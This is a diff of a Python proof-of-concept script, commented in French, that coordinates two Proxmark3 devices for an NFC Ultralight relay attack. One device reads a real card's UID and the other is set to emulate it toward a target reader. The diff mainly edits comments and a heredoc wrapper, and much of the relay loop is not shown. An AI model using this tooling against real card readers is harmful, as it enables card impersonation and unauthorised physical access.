@@ -1,4 +1,3 @@
-cat << 'EOF' > pm3_relay_poc.py
 import subprocess
 import time
 import re
@@ -50,7 +49,7 @@ class PM3Process:
 def start_relay():
     print("=== POC RELAI PROXMARK3 ULTRALIGHT ===")
     
-    # 1. Initialisation des instances
+    #Initialisation des instances
     proxy = PM3Process(PROXY_PORT)
     mole = PM3Process(MOLE_PORT)
     time.sleep(3) # Temps pour l'initialisation hardware
@@ -59,7 +58,7 @@ def start_relay():
     mole.flush_output()
     time.sleep(1)
 
-    # 2. Préparation du Mole (lecture UID carte originale)
+    #Préparation du Mole (lecture UID carte originale)
     print("[*] Initialisation du Mole sur la vraie carte...")
     mole.send("script run hf_mole_relay")
     ready_line = mole.read_until("READY:")
@@ -72,12 +71,12 @@ def start_relay():
     print(f"[+] Carte détectée ! UID: {uid}")
 
     time.sleep(1)
-    # 3. Préparation du Proxy (Simulation de l'UID)
+    #Préparation du Proxy (Simulation de l'UID)
     print(f"[*] Simulation de l'UID {uid} sur le Proxy...")
     #proxy.send(f"hf 14a sim -t 7 -v -u {uid}") 
     print("[*] Mode simulation actif. En attente du lecteur cible...")
 
-    # 4. Boucle de relai temps réel
+    #Boucle de relai temps réel
     try:
         print("[*] Relai actif. En attente du lecteur...")
         while True:
@@ -130,4 +129,3 @@ def start_relay():
 
 if __name__ == "__main__":
     start_relay()
-EOF
